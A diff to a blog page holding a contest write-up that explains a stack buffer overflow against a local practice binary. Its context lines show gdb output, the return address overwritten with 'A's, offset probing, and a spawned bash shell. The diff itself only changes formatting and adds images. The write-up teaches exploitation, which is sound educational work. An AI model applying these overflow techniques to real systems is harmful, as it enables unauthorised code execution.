@@ -2,7 +2,7 @@
 <html lang="">
 
 
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta name="keywords" content="[GCI2019] Buffer Overflow, YYBlog">
     <meta name="description" content="This is the write-up for the task Buffer Overflow in GCI2019!
@@ -383,7 +383,9 @@ Dump of assembler code for function main:
    0x0000555555555191 &lt;+76&gt;:    leaveq 
    0x0000555555555192 &lt;+77&gt;:    retq   
 End of assembler dump.</code></pre><p>When the system calls the <code>main</code> function, the return pointer was pushed into the stack, the char buffer is pushed afterwards and then the input is copied</p>
+<p><img src="stack.png" alt></p>
 <p>Therefore, if the input is too long, it may overwrite the return address</p>
+<p><img src="overflow.png" alt></p>
 <pre><code>(gdb) run $(python2 -c &quot;print(&#39;A&#39;*300)&quot;)
 Starting program: /home/yi/Workspace/GCI/BufferOverflow/exploitme $(python2 -c &quot;print(&#39;A&#39;*300)&quot;)
 
@@ -399,9 +401,10 @@ Program received signal SIGSEGV, Segmentation fault.
 =&gt; 0x555555555192 &lt;main+77&gt;:    retq
 
 (gdb) x/g $rsp
-0x7fffffffd908:    0x4141414141414141</code></pre><p>The return address was overwritten to ‘A’s (<code>0x41</code>) 
-When the <code>main</code> function finishes and is going to return, the system can not access the address <code>0x4141414141414141</code> so it causes segfault</p>
+0x7fffffffd908:    0x4141414141414141</code></pre><p>The return address was overwritten to ‘A’s (<code>0x41</code>)</p>
+<p>When the <code>main</code> function finishes and is going to return, the system can not access the address <code>0x4141414141414141</code> so it causes segfault</p>
 <p>However, if we can overwrite the address intentionally and point it to the buffer, we can trick the program into running our assembly code</p>
+<p><img src="exploit.png" alt></p>
 <p>Let’s test different lengths to find out where the address is</p>
 <pre><code>&#39;A&#39;*300 -&gt; segfault
 &#39;A&#39;*200 -&gt; exited normally
@@ -459,7 +462,7 @@ process 116461 is executing new program: /usr/bin/bash
 [yi@YNB BufferOverflow]$</code></pre><p>We got the shell!</p>
 
             </div>
-            <hr>
+            <hr/>
 
             
 
@@ -483,14 +486,18 @@ process 116461 is executing new program: /usr/bin/bash
         
             <div class="center-align">
                 <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
-                    <img alt style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
                 </a>
             </div>
-            <br>
-            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
                     《[GCI2019] Buffer Overflow》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/01/08/GCI2019-BufferOverflow/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/01/08/GCI2019-BufferOverflow/" property="cc:attributionName"
+               rel="cc:attributionURL">
                 Yi Kuo
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -529,7 +536,7 @@ process 116461 is executing new program: /usr/bin/bash
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-dot-circle-o"></i>&nbsp;Current
             </div>
@@ -781,7 +788,8 @@ vector&lt;pair&lt;int, int>> v
     <div class="modal-content">
         <div class="search-header">
             <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
-            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword" class="search-input">
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
         </div>
         <div id="searchResult"></div>
     </div>
